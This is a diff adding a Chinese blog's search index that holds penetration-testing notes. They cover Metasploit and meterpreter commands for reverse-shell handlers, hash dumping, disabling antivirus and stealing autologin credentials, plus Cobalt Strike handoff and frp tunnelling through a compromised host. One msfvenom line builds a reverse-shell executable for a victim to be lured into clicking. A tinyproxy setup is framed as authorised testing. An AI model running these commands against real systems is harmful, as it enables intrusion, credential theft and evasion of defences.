@@ -1,0 +1,120 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>前端加密爆破</title>
+      <link href="/2024/03/08/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/"/>
+      <url>/2024/03/08/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>msf常用命令</title>
+      <link href="/2024/03/08/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
+      <url>/2024/03/08/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
+      
+        <content type="html"><![CDATA[<h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h4 id="MSF常用参数命令："><a href="#MSF常用参数命令：" class="headerlink" title="MSF常用参数命令："></a>MSF常用参数命令：</h4><ul><li>reload_all #从目录重载所有模块</li><li>back #后退命令，移出当前上下文，用于模块切换</li><li>info #目标和模块详细信息</li><li>check #检查目标是否受某个漏洞影响</li><li>sessions #会话管理</li><li>sessions -l #列出所有会话</li><li>sessions -K #终止所有会话</li><li>sessions -i id #进入某个会话</li><li>sessions -v #以详细模式列出会话</li><li>sessions -u #在许多平台上将shell升级到meterpreter会话</li><li>show options #显示可选选项；</li></ul><h4 id="MSF漏洞利用步骤："><a href="#MSF漏洞利用步骤：" class="headerlink" title="MSF漏洞利用步骤："></a>MSF漏洞利用步骤：</h4><ul><li>search xxx #搜索某个漏洞</li><li>use xxx #使用某个漏洞利用模块</li><li>show options #查看配置选项</li><li>set payload #配置攻击载荷</li><li>exploit&#x2F;run #执行渗透攻击</li></ul><h4 id="MSF监听反弹shell："><a href="#MSF监听反弹shell：" class="headerlink" title="MSF监听反弹shell："></a>MSF监听反弹shell：</h4><ul><li>msf6 &gt; use exploit&#x2F;multi&#x2F;handler</li><li>msf6 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</li><li>msf6 exploit(multi&#x2F;handler) &gt; set LHOST 0.0.0.0</li><li>msf6 exploit(multi&#x2F;handler) &gt; set LPORT 4444</li><li>msf6 exploit(multi&#x2F;handler) &gt; run</li></ul><h4 id="Meterpreter命令："><a href="#Meterpreter命令：" class="headerlink" title="Meterpreter命令："></a>Meterpreter命令：</h4><ul><li>pwd、ls、cd、ps、cat #通用命令</li><li>background #将当前meterpreter会话隐藏在后台sessions中</li><li>getpid #查看当前Meterpreter Shell的进程号</li><li>getuid #查看当前权限</li><li>migrate 476 #将shell迁移到PID为786的进程中</li><li>getsystem #获得系统管理员权限（要本地管理员权限运行）</li><li>hashdump #抓哈希密码</li><li>sysinfo #查看系统信息</li><li>route #查看目标机完整网络设置</li><li>shell #进入目标机shell，exit退出shell</li><li>upload .&#x2F;1.txt c:\1.txt #上传文件</li><li>download c:\1.txt .&#x2F; #下载文件</li><li>search -f *.txt -d c:&#x2F;&#x2F; #搜索文件</li></ul><h4 id="MSF后渗透命令："><a href="#MSF后渗透命令：" class="headerlink" title="MSF后渗透命令："></a>MSF后渗透命令：</h4><ul><li>run post&#x2F;windows&#x2F;gather&#x2F;checkvm #查看目标是否允许在虚拟机</li><li>run post&#x2F;windows&#x2F;manage&#x2F;killav #关闭杀毒软件</li><li>run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp #开启3389远程桌面</li><li>run post&#x2F;windows&#x2F;manage&#x2F;autoroute #查看目标子网情况</li><li>run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users #列举当前有多少用户登录过目标主机</li><li>run post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;windows_autologin #抓取自动登录的用户名密码</li><li>run post&#x2F;windows&#x2F;gather&#x2F;enum_applications #列举应用程序</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 命令手册 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 常用命令 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>cs-msf联动</title>
+      <link href="/2022/07/05/cs-msf%E8%81%94%E5%8A%A8/"/>
+      <url>/2022/07/05/cs-msf%E8%81%94%E5%8A%A8/</url>
+      
+        <content type="html"><![CDATA[<h3 id="1-、cs-spwan-to-msf-shell"><a href="#1-、cs-spwan-to-msf-shell" class="headerlink" title="1 、cs spwan to msf shell"></a>1 、cs spwan to msf shell</h3><h4 id="cs创建监听器"><a href="#cs创建监听器" class="headerlink" title="cs创建监听器"></a>cs创建监听器</h4><ul><li>payload：Foreign HTTP</li></ul><h4 id="msf-监听反弹shell"><a href="#msf-监听反弹shell" class="headerlink" title="msf 监听反弹shell"></a>msf 监听反弹shell</h4><pre><code>msf6 &gt; use exploit/multi/handlermsf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &gt; set LHOST 0.0.0.0msf6 exploit(multi/handler) &gt; set LPORT 4444msf6 exploit(multi/handler) &gt; run</code></pre><h3 id="2、msf-to-cs-shell"><a href="#2、msf-to-cs-shell" class="headerlink" title="2、msf to cs shell"></a>2、msf to cs shell</h3><ul><li>获取shell</li></ul><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;ip LPORT&#x3D;prot -f exe &gt; xxx.exe</p><ul><li>监听，邀请小伙伴点击，上线</li><li>反弹shell到cs</li></ul><pre><code>msf6 &gt; use exploit/windows/local/payload_inject set[*] No payload configured, defaulting to windows/meterpreter/reverse_tcpmsf6 exploit(windows/local/payload_inject) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf6 exploit(windows/local/payload_inject) &gt; set lhost xxxmsf6 exploit(windows/local/payload_inject) &gt; set lport xxx（cs的）msf6 exploit(windows/local/payload_inject) &gt; ser session xmsf6 exploit(windows/local/payload_inject) &gt; run</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> Pentest </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> C2 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>隧道代理工具的使用</title>
+      <link href="/2022/07/05/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
+      <url>/2022/07/05/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<h3 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h3><h4 id="Frp配置"><a href="#Frp配置" class="headerlink" title="Frp配置"></a>Frp配置</h4><p>靶机</p><pre><code>#frpc.ini[common]server_addr = server_port = [http_proxy]type = tcpremote_port = plugin = socks5</code></pre><p>vps</p><pre><code>#frps.ini[common]bind_addr = 0.0.0.0bind_port = </code></pre><h4 id="Frp启动"><a href="#Frp启动" class="headerlink" title="Frp启动"></a>Frp启动</h4><p>vps建立服务端</p><pre><code>./frps -c frps.ini</code></pre><p>靶机开启客户端</p><pre><code>shell cd [frp所在路径] &amp;&amp; frpc.exe -c frpc.ini</code></pre><h3 id="proxychains设置"><a href="#proxychains设置" class="headerlink" title="proxychains设置"></a>proxychains设置</h3><pre><code># 配置路径# /etc/proxychains.conf[ProxyList]# add proxy here ...# meanwile# defaults set to &quot;tor&quot;#socks4    127.0.0.1 9050# examplesocks5  127.0.0.1 8888# 使用# proxychains curl cip.cc</code></pre><h3 id="msf设置代理"><a href="#msf设置代理" class="headerlink" title="msf设置代理"></a>msf设置代理</h3><pre><code>setg Proxyies socks5:ip:portsetg ReverseAllowProxy true</code></pre><h3 id="windows设置代理"><a href="#windows设置代理" class="headerlink" title="windows设置代理"></a>windows设置代理</h3><ul><li>Proxifier</li></ul><p>隧道比较脆弱，能使用规则或者直接代理到浏览器使用。</p><p>默认开启为全局代理。可设置规则</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 折腾记录 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 代理 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>tinyproxy</title>
+      <link href="/2022/06/17/tinyproxy/"/>
+      <url>/2022/06/17/tinyproxy/</url>
+      
+        <content type="html"><![CDATA[<h3 id="tinyproxy"><a href="#tinyproxy" class="headerlink" title="tinyproxy"></a>tinyproxy</h3><h4 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1 前言"></a>0x1 前言</h4><p>因为公司的出口IP是固定，如果做”远程”渗透测试（要有授权书）以及远程扫描等工作的时候没和客户沟通好，会出现误封IP的情况，导致业务无法流畅的运行，沟通成本很高，遂搭建代理服务器在一定程度上避免这种情况的发生。</p><h4 id="0x2-代理搭建"><a href="#0x2-代理搭建" class="headerlink" title="0x2 代理搭建"></a>0x2 代理搭建</h4><h5 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h5><p>阿里云ECS Ubuntu18.04</p><h5 id="代理软件"><a href="#代理软件" class="headerlink" title="代理软件"></a>代理软件</h5><p>tinyproxy</p><h5 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h5><pre><code class="shell">apt install tinyproxy  #安装vim /etc/tinyproxy/tinyproxy.conf  #修改配置以下为修改的内容---------Port xxxx  #改成不冲突的端口号，安全组需放通Allow 127.0.0.1 # 注释掉才能允许其他机器访问---------systemctl restart tinyproxynetstat -ano |grep xxxx #查看端口是否启动</code></pre><h4 id="0x3-代理使用"><a href="#0x3-代理使用" class="headerlink" title="0x3 代理使用"></a>0x3 代理使用</h4><p>浏览器代理插件以及其他软件的代理配置</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 折腾记录 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 代理 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
